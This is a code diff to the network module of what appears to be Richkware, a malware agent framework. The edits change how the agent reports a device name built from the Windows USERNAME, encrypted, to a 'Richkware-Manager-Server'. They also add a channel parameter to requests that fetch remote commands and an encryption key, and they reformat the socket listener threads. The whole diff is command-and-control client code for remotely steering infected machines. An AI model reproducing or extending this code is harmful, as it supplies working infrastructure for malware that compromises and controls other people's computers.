@@ -2,6 +2,7 @@
 *      Copyright 2016 Riccardo Melioli.
 */
 
+#include <iostream>
 
 #include "network.h"
 
@@ -162,6 +163,8 @@ Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &po
     name.append("/");
     name.append(getenv("USERNAME"));
 
+    name = crypto.Encrypt(name);
+
     // encrypt only serverPort because name is used by the server to recognize the device
     std::string serverPortS = crypto.Encrypt(serverPort);
     //Device device = Device(name, serverPortS);
@@ -195,7 +198,8 @@ std::string Network::fetchCommand() {
     std::string prt(port);
 
     http::Request request(
-            "http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command?data0=" + device + "&data1=agent");
+            "http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command?data0=" + device +
+            "&channel=richkware");
 
 //    std::string parameters = "{data0:\"" + device + "\",data1:\"agent\"}";
 //    std::cout << parameters << std::endl;
@@ -335,7 +339,7 @@ std::string Network::GetEncryptionKeyFromRMS(const std::string &serverAddress, c
 
     std::string nameS = crypto.Encrypt(name);
 
-    std::string packet = "GET /Richkware-Manager-Server/encryptionKey?id=" + nameS + " HTTP/1.1\r\n"
+    std::string packet = "GET /Richkware-Manager-Server/encryptionKey?id=" + nameS + "&channel=richkware HTTP/1.1\r\n"
                                                                                      "Host: " + serverAddress + "\r\n" +
                          "Connection: close\r\n" +
                          "\r\n";
@@ -462,9 +466,11 @@ std::string Server::getPort() {
     return port;
 }
 
-DWORD WINAPI ServerThread(void *arg) {
-    std::string encryptionKey = (std::string) ((*((ServerThreadArgs *) arg)).encryptionKey);
-    SOCKET ListenSocket = (SOCKET) ((*((ServerThreadArgs *) arg)).ListenSocket);
+DWORD WINAPI
+
+ServerThread(void *arg) {
+    std::string encryptionKey = (std::string)((*((ServerThreadArgs *) arg)).encryptionKey);
+    SOCKET ListenSocket = (SOCKET)((*((ServerThreadArgs *) arg)).ListenSocket);
 
     //HANDLE hClientThreadArray[1000];
     SOCKET ClientSocket = INVALID_SOCKET;
@@ -490,7 +496,9 @@ DWORD WINAPI ServerThread(void *arg) {
 }
 
 
-DWORD WINAPI ClientSocketThread(void *arg) {
+DWORD WINAPI
+
+ClientSocketThread(void *arg) {
     ClientSocketThreadArgs csta = *((ClientSocketThreadArgs *) arg);
     SOCKET ClientSocket = csta.ClientSocket;
     std::string encryptionKey = csta.encryptionKey;
